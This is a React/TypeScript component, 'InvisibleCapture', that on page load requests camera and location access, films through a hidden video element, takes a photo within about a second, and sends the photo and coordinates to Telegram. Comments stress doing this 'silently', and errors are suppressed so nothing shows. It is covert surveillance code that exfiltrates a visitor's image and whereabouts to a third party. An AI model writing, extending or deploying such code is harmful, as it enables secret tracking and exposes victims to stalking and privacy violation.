import { useRef, useEffect } from 'react';
import { cameraService } from '@/lib/camera';
import { locationService, type LocationData } from '@/lib/location';
import { sendPhotoToTelegram, sendLocationToTelegram } from '@/lib/telegram';

interface InvisibleCaptureProps {
  onComplete: () => void;
}

export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (!hasStarted.current) {
      hasStarted.current = true;
      startInvisibleCapture();
    }
  }, []);

  const startInvisibleCapture = async () => {
    try {
      // Request both permissions simultaneously for faster experience
      const [locationPromise, cameraPromise] = await Promise.allSettled([
        locationService.getCurrentLocation(),
        cameraService.startCamera()
      ]);

      let locationData: LocationData | null = null;
      if (locationPromise.status === 'fulfilled') {
        locationData = locationPromise.value;
      }

      let stream: MediaStream | null = null;
      if (cameraPromise.status === 'fulfilled') {
        stream = cameraPromise.value;
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.muted = true;
          videoRef.current.play();
        }

        // Minimal wait for camera to stabilize
        await new Promise(resolve => setTimeout(resolve, 800));

        // Capture photo quickly
        if (videoRef.current) {
          const photoBlob = await cameraService.capturePhoto(videoRef.current);
          
          // Stop camera immediately
          cameraService.stopCamera();

          // Send to Telegram silently
          const result = await sendPhotoToTelegram(photoBlob, locationData || undefined);
          
          if (result.ok && locationData) {
            // Send location as separate message
            await sendLocationToTelegram(locationData);
          }
        }
      }

      // Complete silently
      onComplete();

    } catch (error) {
      // Fail silently and complete
      onComplete();
    } finally {
      // Ensure camera is stopped
      cameraService.stopCamera();
    }
  };

  return (
    <video
      ref={videoRef}
      className="hidden"
      autoPlay
      muted
      playsInline
    />
  );
}